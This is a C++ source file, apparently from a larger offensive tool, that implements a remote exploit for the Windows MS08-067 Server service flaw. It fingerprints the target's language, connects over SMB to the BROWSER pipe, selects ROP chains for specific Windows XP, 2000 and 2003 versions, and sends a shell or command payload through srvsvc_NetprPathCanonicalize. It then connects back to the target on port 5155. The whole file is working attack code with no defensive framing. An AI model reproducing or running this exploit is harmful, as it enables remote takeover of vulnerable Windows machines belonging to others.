/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "ms08-067.h"

#include "rpc.h"
#include "rpcndr.h"

extern RPC_BINDING_HANDLE srvsvc__MIDL_AutoBindHandle;

#include "smb.h"
#include "generated\srvsvc.h"
#include "macro.h"
#include "finger_print.h"
#include "payload.h"
#include "random.h"

#include "memory_debug.h"

Ms08067::Ms08067(){
	Ms08067::handle = CreateMutex(NULL, FALSE, NULL);
}

Ms08067::~Ms08067(){
	if (Ms08067::handle == 0){
		CloseHandle(Ms08067::handle);
	}
}


HANDLE Ms08067::handle = 0;

Ms08067 Ms08067::single;

bool Ms08067::result = false;

DWORD WINAPI Ms08067::sendPayload(LPVOID lpParam){
	unsigned char	outputBuffer[4096] = {0};
	char	pathtype[100] = {0};
	RPC_STATUS status;
	char * bufferPayload = (char*)lpParam;
	(DWORD)*(DWORD *)pathtype = 4097;

	wchar_t name[10];
	Random::createRandomName(9, name);

	Ms08067::result = true;

	MYPRINTF("\t\tsending payload...\n");
	RpcTryExcept
	{
		srvsvc_NetprPathCanonicalize(srvsvc__MIDL_AutoBindHandle, name, (wchar_t *)bufferPayload, outputBuffer, 4096, L"\\", (long *)pathtype, 0);
	}	RpcExcept ( 1 )
	{
		status = RpcExceptionCode();
		if(status == 1726) {
			MYPRINTF("\t\tpayload sent !\n");
			Ms08067::result = true;
		} else {
			Ms08067::result = false;
			MYPRINTF("\t\tRpcExceptionCode() = %u\n", status);
		}
	}
	RpcEndExcept

		Ms08067::result = true;
	return 0;
}

bool Ms08067::getAShell(char *target, windows_version version){
	if (WaitForSingleObject(Ms08067::handle, INFINITE) == WAIT_FAILED){
		MYPRINTF("WaitForSingleObject: %d\n", GetLastError());
	}
	bool res = attack(target, version, true);
	ReleaseMutex(Ms08067::handle);
	return res;
}

bool Ms08067::openPort(char *target, windows_version version){
	if (WaitForSingleObject(Ms08067::handle, INFINITE) == WAIT_FAILED){
		MYPRINTF("WaitForSingleObject: %d\n", GetLastError());
	}
	bool res = attack(target, version, false);
	ReleaseMutex(Ms08067::handle);
	return res;
}


bool Ms08067::attack(char *target, windows_version version, bool getAShell){
	FingerPrint::TARGETS targetOs;
	bool success = false;
	Ms08067::result = false;

	targetOs = FingerPrint::connectAndGetLanguage(target);

	if (targetOs == FingerPrint::Dontknow){
		MYPRINTF( "Dont know xp version\n");
		return false;
	}
	if (targetOs == FingerPrint::Nofinger){
		targetOs = FingerPrint::English;
	}

	if (!Smb::connect(target)) {
		MYPRINTF( "Unable to connect\n");
		return false;
	}

	if (!Smb::bindToBrowserPipe((unsigned char *)target)) {
		MYPRINTF( "Unable to bind to BROWSER\n");
		return false;
	}

	unsigned char *bufferPayload;

	switch(version){
	case sp3:
		bufferPayload = getPayload(getAShell, Payload::ropsXp3[targetOs]);
		break;
	case sp2:
		bufferPayload = getPayload(getAShell, Payload::ropsXp2[targetOs]);
		break;
	case windows2000:
		bufferPayload = getPayload(getAShell, Payload::ropsOthers[0]);
		break;
	case sp0:
		bufferPayload = getPayload(getAShell, Payload::ropsOthers[1]);
		break;
	case windows2003sp0:
		bufferPayload = getPayload(getAShell, Payload::ropsOthers[2]);
		break;
	case windows2003sp1english:
		bufferPayload = getPayload(getAShell, Payload::ropsOthers[3]);
		break;
	case windows2003sp1japanese:
		bufferPayload = getPayload(getAShell, Payload::ropsOthers[4]);
		break;
	case windows2003sp2english:
		bufferPayload = getPayload(getAShell, Payload::ropsOthers[5]);
		break;
	case windows2003sp2german:
		bufferPayload = getPayload(getAShell, Payload::ropsOthers[6]);
		break;
	default:
		return false;
	}

	DWORD id;
	HANDLE handle = CreateThread(NULL, 0, sendPayload, bufferPayload, 0, &id);
	Sleep(2000);
	TerminateThread(handle, 0);
	free(bufferPayload);

	RpcBindingFree( &srvsvc__MIDL_AutoBindHandle );
	srvsvc__MIDL_AutoBindHandle = NULL;

	if (!Smb::closeConnection(target)){
		MYPRINTF( "Unable to close\n");
	}
	return Ms08067::result;
}

unsigned char *Ms08067::getPayload(bool getShellPayload, Payload::Rop rop){
	if (getShellPayload){
		return Payload::createShellPayload(rop);
	} else {
		return Payload::createCmdPayload(rop);
	}
}

Tcp Ms08067::getCommandSocket(char *target){
	Tcp tcp(target, 5155);
	tcp.tcpconnect();
	return tcp;
}